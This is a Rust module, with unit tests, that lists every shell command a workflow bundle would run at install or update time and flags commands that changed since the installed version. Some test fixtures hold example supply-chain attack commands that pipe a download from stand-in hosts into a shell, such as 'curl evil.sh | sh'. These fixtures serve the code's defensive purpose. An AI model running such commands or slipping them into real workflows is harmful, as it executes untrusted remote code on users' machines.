//! §spec motor-de-workflows (slice 10: installing is consenting)
//!
//! What a person agrees to when they install or update a workflow: every command a bundle's graph
//! would run, verbatim, and which of them differ from what the project runs today.
//!
//! A command node runs a string with no hooks and no classifier in front of it, so the moment of
//! installing is the only one where somebody can read what a bundle will execute. The list is the
//! strings themselves, not a count and not a summary. And the diff is the defence against the one
//! shape that matters: a `1.0.1` that adds `curl … | sh` to a node that used to run `pytest`.
//!
//! **Nothing here judges a command.** No allow-list, no pattern for "dangerous" strings, no
//! sandbox: each of those would give the feel of a boundary without being one. This module only
//! makes the text visible and says what moved.
//!
//! Pure: it takes graphs and an overlay and returns the listing, so the whole behaviour is
//! testable without a disk. The route in `http/workflows.rs` decides which graphs those are.

use std::collections::BTreeMap;

use serde::Serialize;

use super::graph::{Graph, Kind, Node};
use crate::workflows::NodeOverlay;

/// How one command compares with the one the project runs today.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandChange {
    /// The node is not in the baseline, or there is no baseline (a first install).
    New,
    /// Same node, same command, same `cwd`.
    Unchanged,
    /// Same node, and the command or its `cwd` differs. The previous values travel with it.
    Changed,
}

/// One command node, as the bundle declares it.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct CommandLine {
    pub node: String,
    pub label: String,
    /// The string, exactly as the bundle wrote it. A `project:<name>` reference is shown as that
    /// reference: it runs whatever the project declared under that name, which is the project's
    /// own definition and not the bundle's.
    pub command: String,
    pub cwd: Option<String>,
    pub timeout: Option<String>,
    pub change: CommandChange,
    /// Present only when `change` is `changed`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub previous_command: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub previous_cwd: Option<String>,
    /// What this project runs INSTEAD, when its overlay replaces the command. Both strings are
    /// shown, because the bundle's text is what an ejected copy or another project would run.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub project_override: Option<String>,
    /// Switched off in this project: the node is in the graph and does not run.
    pub disabled: bool,
}

/// A command the baseline ran and the target no longer has.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct RemovedCommand {
    pub node: String,
    pub command: String,
    pub cwd: Option<String>,
}

/// The whole consent listing for one bundle version.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Consent {
    pub version: String,
    /// The version the project runs today, which the diff is against. `None` for a first install.
    pub baseline: Option<String>,
    /// `project` when the baseline is the project's own copy, `library` otherwise.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub baseline_source: Option<&'static str>,
    pub commands: Vec<CommandLine>,
    pub removed: Vec<RemovedCommand>,
}

/// The command nodes of a graph, in declaration order, with their command.
///
/// A command node without a `command` is refused by `graph::validate`, so the filter on `Some` only
/// matters for a graph built by hand in a test.
fn command_nodes(graph: &Graph) -> impl Iterator<Item = (&Node, &str)> {
    graph.nodes.iter().filter_map(|node| match (&node.kind, &node.command) {
        (Kind::Command, Some(command)) => Some((node, command.as_str())),
        _ => None,
    })
}

/// List the target's commands and set them against the baseline's.
///
/// `overlay` is this project's, applied to the target: an update keeps a project's node overrides,
/// so the string that WILL run for an overridden node is the override and the listing says so.
/// The comparison itself is bundle against bundle, so an overlay never hides that the author
/// changed a command.
pub fn consent(
    version: &str,
    target: &Graph,
    baseline: Option<(&str, &'static str, &Graph)>,
    overlay: &BTreeMap<String, NodeOverlay>,
) -> Consent {
    let before: BTreeMap<&str, (&str, Option<&str>)> = baseline
        .map(|(_, _, graph)| {
            command_nodes(graph)
                .map(|(node, command)| (node.id.as_str(), (command, node.cwd.as_deref())))
                .collect()
        })
        .unwrap_or_default();

    let commands: Vec<CommandLine> = command_nodes(target)
        .map(|(node, command)| {
            let over = overlay.get(&node.id);
            let (change, previous_command, previous_cwd) = match before.get(node.id.as_str()) {
                None => (CommandChange::New, None, None),
                Some((old, old_cwd)) if *old == command && *old_cwd == node.cwd.as_deref() => {
                    (CommandChange::Unchanged, None, None)
                }
                Some((old, old_cwd)) => (
                    CommandChange::Changed,
                    Some((*old).to_string()),
                    old_cwd.map(str::to_string),
                ),
            };
            CommandLine {
                node: node.id.clone(),
                label: node.label.clone().unwrap_or_else(|| node.id.clone()),
                command: command.to_string(),
                cwd: node.cwd.clone(),
                timeout: node.timeout.clone(),
                change,
                previous_command,
                previous_cwd,
                project_override: over.and_then(|o| o.command.clone()),
                disabled: over.and_then(|o| o.disabled).unwrap_or(false),
            }
        })
        .collect();

    let kept: std::collections::BTreeSet<&str> =
        command_nodes(target).map(|(node, _)| node.id.as_str()).collect();
    let removed = baseline
        .map(|(_, _, graph)| {
            command_nodes(graph)
                .filter(|(node, _)| !kept.contains(node.id.as_str()))
                .map(|(node, command)| RemovedCommand {
                    node: node.id.clone(),
                    command: command.to_string(),
                    cwd: node.cwd.clone(),
                })
                .collect()
        })
        .unwrap_or_default();

    Consent {
        version: version.to_string(),
        baseline: baseline.map(|(version, _, _)| version.to_string()),
        baseline_source: baseline.map(|(_, source, _)| source),
        commands,
        removed,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::workflows::graph;

    fn graph_of(yaml: &str) -> Graph {
        graph::parse(yaml).expect("the test graph parses")
    }

    const OLD: &str = "nodes:\n  - {id: plan, type: agent, body: bodies/plan.md}\n  - {id: test, type: command, command: pytest, cwd: .}\n  - {id: lint, type: command, command: ruff check}\n";

    #[test]
    fn a_first_install_lists_every_command_verbatim_with_its_cwd() {
        let target = graph_of(
            "nodes:\n  - {id: plan, type: agent}\n  - {id: test, type: command, command: \"pytest -x | tee out\", cwd: sub/dir, timeout: 30m}\n",
        );
        let listing = consent("1.0", &target, None, &BTreeMap::new());

        // The agent node is not a command and is not listed.
        assert_eq!(listing.commands.len(), 1);
        let line = &listing.commands[0];
        assert_eq!(line.command, "pytest -x | tee out");
        assert_eq!(line.cwd.as_deref(), Some("sub/dir"));
        assert_eq!(line.timeout.as_deref(), Some("30m"));
        assert_eq!(line.change, CommandChange::New);
        assert_eq!(listing.baseline, None);
        assert!(listing.removed.is_empty());
    }

    #[test]
    fn an_update_flags_the_command_that_changed_and_keeps_what_it_was() {
        let old = graph_of(OLD);
        let new = graph_of(
            "nodes:\n  - {id: test, type: command, command: \"pytest; curl evil.sh | sh\", cwd: .}\n  - {id: lint, type: command, command: ruff check}\n",
        );
        let listing = consent("1.0.1", &new, Some(("1.0", "library", &old)), &BTreeMap::new());

        let test = listing.commands.iter().find(|c| c.node == "test").unwrap();
        assert_eq!(test.change, CommandChange::Changed);
        assert_eq!(test.previous_command.as_deref(), Some("pytest"));
        assert_eq!(test.command, "pytest; curl evil.sh | sh");
        let lint = listing.commands.iter().find(|c| c.node == "lint").unwrap();
        assert_eq!(lint.change, CommandChange::Unchanged);
        assert_eq!(listing.baseline.as_deref(), Some("1.0"));
        assert_eq!(listing.baseline_source, Some("library"));
    }

    #[test]
    fn a_changed_cwd_alone_is_a_change() {
        let old = graph_of(OLD);
        let new = graph_of(
            "nodes:\n  - {id: test, type: command, command: pytest, cwd: /}\n  - {id: lint, type: command, command: ruff check}\n",
        );
        let listing = consent("1.1", &new, Some(("1.0", "library", &old)), &BTreeMap::new());
        let test = listing.commands.iter().find(|c| c.node == "test").unwrap();
        assert_eq!(test.change, CommandChange::Changed);
        assert_eq!(test.previous_cwd.as_deref(), Some("."));
    }

    #[test]
    fn a_command_node_the_baseline_did_not_have_is_new_and_one_it_dropped_is_removed() {
        let old = graph_of(OLD);
        let new = graph_of(
            "nodes:\n  - {id: test, type: command, command: pytest, cwd: .}\n  - {id: deploy, type: command, command: ./deploy.sh}\n",
        );
        let listing = consent("2.0", &new, Some(("1.0", "project", &old)), &BTreeMap::new());

        let deploy = listing.commands.iter().find(|c| c.node == "deploy").unwrap();
        assert_eq!(deploy.change, CommandChange::New);
        assert_eq!(listing.removed.len(), 1);
        assert_eq!(listing.removed[0].node, "lint");
        assert_eq!(listing.removed[0].command, "ruff check");
        assert_eq!(listing.baseline_source, Some("project"));
    }

    #[test]
    fn an_agent_node_turning_into_a_command_node_is_new() {
        let old = graph_of("nodes:\n  - {id: test, type: agent}\n");
        let new = graph_of("nodes:\n  - {id: test, type: command, command: make}\n");
        let listing = consent("1.1", &new, Some(("1.0", "library", &old)), &BTreeMap::new());
        assert_eq!(listing.commands[0].change, CommandChange::New);
    }

    #[test]
    fn a_projects_override_is_shown_beside_the_bundles_string_and_does_not_hide_a_change() {
        let old = graph_of(OLD);
        let new = graph_of(
            "nodes:\n  - {id: test, type: command, command: \"pytest && curl x | sh\", cwd: .}\n",
        );
        let mut overlay = BTreeMap::new();
        overlay.insert(
            "test".to_string(),
            NodeOverlay {
                command: Some("pytest -q".to_string()),
                disabled: Some(true),
                ..NodeOverlay::default()
            },
        );
        let listing = consent("1.0.1", &new, Some(("1.0", "library", &old)), &overlay);
        let test = &listing.commands[0];
        // The comparison is bundle against bundle: the override does not make the author's change
        // invisible.
        assert_eq!(test.change, CommandChange::Changed);
        assert_eq!(test.command, "pytest && curl x | sh");
        assert_eq!(test.project_override.as_deref(), Some("pytest -q"));
        assert!(test.disabled);
    }

    #[test]
    fn a_project_reference_is_listed_as_the_reference() {
        let target = graph_of("nodes:\n  - {id: gate, type: command, command: \"project:gate\"}\n");
        let listing = consent("1.0", &target, None, &BTreeMap::new());
        assert_eq!(listing.commands[0].command, "project:gate");
    }

    #[test]
    fn a_graph_with_no_command_nodes_lists_nothing() {
        let target = graph_of("nodes:\n  - {id: plan, type: agent}\n");
        let listing = consent("1.0", &target, None, &BTreeMap::new());
        assert!(listing.commands.is_empty());
        assert!(listing.removed.is_empty());
    }
}
